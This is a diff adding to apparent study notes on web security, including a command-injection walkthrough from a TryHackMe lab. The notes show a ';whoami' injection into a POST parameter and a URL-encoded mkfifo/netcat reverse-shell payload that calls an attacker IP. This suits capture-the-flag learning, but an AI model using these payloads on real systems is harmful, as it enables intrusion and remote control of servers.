@@ -1,4 +1,9 @@
-
+(THB: if you cannot see a website )
+```
+cat /etc/systemd/resolved.conf
+DNS=machineip
+sudo systemctl restart systemd-resolved 
+```
 
 ### Security headers: 
 HTTP headers that improve the security of the web application 
@@ -74,3 +79,39 @@ Then we can include integrity for this site in our code:
 -  **Security Logging & Monitoring Failures**: Services not logging activity on their application
 
 -  **Server-Side Request Forgery (SSRF)**: Attacker can get the web application to send requests on their behalf.  
+
+
+
+#### Command injection:
+
+It can be hard to validate that a parameter on a web application in vulnerable to Command injection. 
+
+Ex. THM Shell room:
+We get info that the POST parameter "file" is vulnerable. 
+
+file=hello.txt   - is a valid command
+file=whoami   - is not a valid command 
+
+Combining them works:
+```
+file=hello.txt;whoami  - is valid, and prints the user 
+```
+
+If we want to inject a shell, it can be hard to know which shell and how to inject it. What worked in this case was discovering that the user used: `\usr\sbin\nologin` as its shell, and after some reading, this results in a **struggle to spawn interactive shell sessions**. 
+
+Q: Interactive shell vs non interactive shell?
+
+What worked in this case:
+```
+Use this shell, and URL encode it:
+
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+
+URL encoded:
+rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+|+nc+10.10.211.62+443+>/tmp/f
+
+The whole POST parameter: 
+file=hello.txt; rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+|+nc+10.10.211.62+443+>/tmp/f;
+
+```
+
